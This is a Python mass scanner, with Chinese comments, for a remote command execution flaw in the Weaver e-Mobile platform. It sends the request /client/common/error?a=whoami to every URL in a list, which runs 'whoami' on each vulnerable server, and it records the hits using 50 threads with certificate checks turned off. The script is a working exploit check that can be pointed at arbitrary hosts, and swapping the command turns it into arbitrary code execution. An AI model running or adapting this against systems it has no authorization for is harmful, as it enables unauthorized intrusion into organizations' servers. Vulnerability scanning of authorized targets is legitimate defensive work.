import requests 
import threading 
from concurrent.futures  import ThreadPoolExecutor, as_completed 
from urllib.parse  import urljoin 
import time 
import os 
import argparse 
from requests.packages.urllib3.exceptions  import InsecureRequestWarning 
 
# 禁用SSL警告 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning) 
 
class WeaverEMobileRCEScanner:
    def __init__(self, max_workers=50, timeout=3):
        """
        泛微e-Mobile漏洞扫描器初始化 
        
        参数:
        max_workers -- 最大线程数 (默认: 50)
        timeout     -- 请求超时时间(秒) (默认: 3)
        """
        self.max_workers  = max_workers 
        self.timeout  = timeout 
        self.session  = requests.Session()
        self.session.verify  = False 
        self.session.max_redirects  = 0  # 禁用自动重定向 
    
    def normalize_url(self, url):
        """
        标准化URL：确保有协议头且无末尾斜杠 
        
        参数:
        url -- 原始URL字符串 
        
        返回:
        标准化后的URL 
        """
        url = url.strip() 
        
        # 添加协议头（默认为http）
        if not url.startswith('http://')  and not url.startswith('https://'): 
            url = 'http://' + url 
            
        # 移除末尾斜杠 
        if url.endswith('/'): 
            url = url[:-1]
            
        return url 
 
    def check_vulnerability(self, url):
        """
        检查单个URL的漏洞（简化版）
        
        检测逻辑:
        1. 发送 GET /client/common/error?a=whoami 
        2. 验证响应状态码为200 
        3. 检查响应中是否包含</cmd>标签 
        
        参数:
        url -- 要检测的目标URL 
        
        返回:
        (测试URL, 是否漏洞, 状态消息)
        """
        try:
            normalized_url = self.normalize_url(url) 
            test_url = urljoin(normalized_url, '/client/common/error?a=whoami')
            
            # 使用POC中的精确请求头 
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Connection': 'close'
            }
            
            # 发送漏洞检测请求 
            response = self.session.get( 
                test_url,
                timeout=self.timeout, 
                headers=headers,
                allow_redirects=False 
            )
            
            # 检测逻辑1: 状态码必须为200 
            if response.status_code  != 200:
                return test_url, False, f"状态码不符({response.status_code}≠200)" 
            
            # 检测逻辑2: 响应中必须包含</cmd>标签 
            if '</cmd>' not in response.text: 
                return test_url, False, "响应中缺少</cmd>标签"
                
            # 同时满足两个条件则判定漏洞存在 
            return test_url, True, "存在漏洞(200+</cmd>)"
                
        except requests.exceptions.Timeout: 
            return url, False, "请求超时"
        except requests.exceptions.ConnectionError: 
            return url, False, "连接错误"
        except requests.exceptions.RequestException  as e:
            return url, False, f"请求异常: {str(e)}"
        except Exception as e:
            return url, False, f"未知错误: {str(e)}"
    
    def generate_status_bar(self, current, total, width=50):
        """生成进度条"""
        progress = int(width * current / total)
        return f"[{'█' * progress}{' ' * (width - progress)}] {current}/{total}"
 
    def scan_urls(self, urls, output_file='result.txt'): 
        """
        扫描URL列表 
        
        参数:
        urls        -- URL列表 
        output_file -- 结果输出文件 
        
        返回:
        漏洞URL列表 
        """
        vulnerable_urls = []
        total_urls = len(urls)
        
        if not total_urls:
            print("错误: URL列表为空")
            return []
            
        print(f"开始扫描 {total_urls} 个URL...")
        print(f"线程数: {self.max_workers},  超时: {self.timeout} 秒")
        print("=" * 60)
        print("检测逻辑:")
        print("  1. 发送 GET /client/common/error?a=whoami")
        print("  2. 验证响应状态码为200")
        print("  3. 检查响应中是否包含</cmd>标签")
        print("=" * 60)
        
        # 使用线程池并发扫描 
        with ThreadPoolExecutor(max_workers=self.max_workers)  as executor:
            futures = {executor.submit(self.check_vulnerability,  url): url for url in urls}
            
            for i, future in enumerate(as_completed(futures), 1):
                url = futures[future]
                try:
                    test_url, is_vulnerable, message = future.result() 
                    
                    # 显示带进度条的状态 
                    status_bar = self.generate_status_bar(i,  total_urls)
                    
                    if is_vulnerable:
                        print(f"{status_bar} \033[1;32m✓ 存在漏洞: {url}\033[0m")
                        vulnerable_urls.append({ 
                            'url': test_url,
                            'original_url': url,
                            'message': message 
                        })
                    else:
                        print(f"{status_bar} \033[1;31m✗ 无漏洞: {url}\033[0m - {message}")
                        
                except Exception as e:
                    print(f"{self.generate_status_bar(i,  total_urls)} \033[1;31m✗ 错误: {url}\033[0m - {str(e)}")
        
        # 保存结果到文件 
        if vulnerable_urls:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("#  泛微e-Mobile漏洞检测报告\n")
                f.write(f"#  扫描时间: {time.strftime('%Y-%m-%d  %H:%M:%S')}\n")
                f.write(f"#  目标数量: {total_urls} | 存在漏洞: {len(vulnerable_urls)}\n")
                f.write("#  漏洞特征: /client/common/error?a=whoami RCE\n")
                f.write("#  检测条件: 状态码200 + 包含</cmd>标签\n")
                f.write("="  * 80 + "\n\n")
                
                for idx, vuln in enumerate(vulnerable_urls, 1):
                    f.write(f"[{idx}]  漏洞URL: {vuln['url']}\n")
                    f.write(f" 原始地址: {vuln['original_url']}\n")
                    f.write(f" 状态信息: {vuln['message']}\n")
                    f.write("-"  * 80 + "\n")
            
            print(f"\n扫描完成! 发现 \033[1;32m{len(vulnerable_urls)}\033[0m 个存在漏洞的URL")
            print(f"详细结果已保存到: \033[1;34m{output_file}\033[0m")
        else:
            print("\n扫描完成! 未发现存在漏洞的URL")
            
        return vulnerable_urls 
 
def read_urls_from_file(filename):
    """从文件读取URL列表"""
    if not os.path.exists(filename): 
        return []
    
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()] 
 
def create_sample_file(filename):
    """创建示例URL文件"""
    sample_urls = [
        "example.com", 
        "http://test-server.com/", 
        "192.168.1.100:8080",
        "https://vuln-weaver-site.net", 
        "http://emobile-demo.org:8088", 
        "10.0.0.5/emp"
    ]
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("#  示例URL列表\n")
        f.write("#  请在此文件添加实际要扫描的目标URL\n\n")
        for url in sample_urls:
            f.write(url  + '\n')
    
    print(f"已创建示例文件: {filename}")
    print("请在该文件中添加实际要扫描的目标URL")
 
def main():
    """主函数"""
    print("\033[1;36m" + "=" * 60)
    print("泛微e-Mobile漏洞扫描工具")
    print(f"扫描时间: 2025-09-27 15:19")
    print("漏洞ID: weaver-e-Mobile-error-RCE")
    print("严重性: 高危(High)")
    print("=" * 60 + "\033[0m")
    print("\033[1;33m漏洞描述:\033[0m")
    print("  泛微e-Mobile移动管理平台在/common/error接口处存在远程命令执行漏洞")
    print("  攻击者可发送特制请求在服务器上执行任意命令")
    print("\033[1;33m检测逻辑:\033[0m")
    print("  1. 发送 GET /client/common/error?a=whoami")
    print("  2. 验证响应状态码为200")
    print("  3. 检查响应中是否包含</cmd>标签")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='泛微e-Mobile漏洞扫描工具')
    parser.add_argument('-i',  '--input', default='url.txt',  help='输入文件路径 (包含URL列表)')
    parser.add_argument('-o',  '--output', default='result.txt',  help='输出结果文件路径')
    parser.add_argument('-t',  '--threads', type=int, default=50, help='扫描线程数 (默认: 50)')
    parser.add_argument('-to',  '--timeout', type=int, default=3, help='请求超时时间(秒) (默认: 3)')
    parser.add_argument('--create-sample',  action='store_true', help='创建示例URL文件')
    
    args = parser.parse_args() 
    
    # 创建示例文件 
    if args.create_sample: 
        create_sample_file(args.input) 
        return 
    
    # 检查输入文件 
    if not os.path.exists(args.input): 
        print(f"\n\033[1;31m错误: 输入文件 '{args.input}'  不存在!\033[0m")
        print("请使用 --create-sample 参数创建示例文件")
        return 
    
    # 读取URL 
    urls = read_urls_from_file(args.input) 
    if not urls:
        print(f"\n\033[1;31m错误: 输入文件 '{args.input}'  中没有有效的URL!\033[0m")
        return 
    
    # 创建扫描器 
    scanner = WeaverEMobileRCEScanner(
        max_workers=args.threads, 
        timeout=args.timeout  
    )
    
    # 开始扫描 
    start_time = time.time() 
    vulnerable_urls = scanner.scan_urls(urls,  args.output) 
    end_time = time.time() 
    
    # 输出统计信息 
    print("\n" + "=" * 60)
    print(f"扫描统计:")
    print(f"  目标数量 : {len(urls)}")
    print(f"  存在漏洞 : {len(vulnerable_urls)}")
    print(f"  扫描耗时 : {end_time - start_time:.2f}秒")
    print(f"  平均速度 : {len(urls)/(end_time - start_time):.1f}个/秒")
    print("=" * 60)
    
    # 显示漏洞URL摘要 
    if vulnerable_urls:
        print("\n\033[1;32m存在漏洞的URL列表:\033[0m")
        for i, vuln in enumerate(vulnerable_urls, 1):
            print(f"  {i}. {vuln['url']}")
 
if __name__ == "__main__":
    main()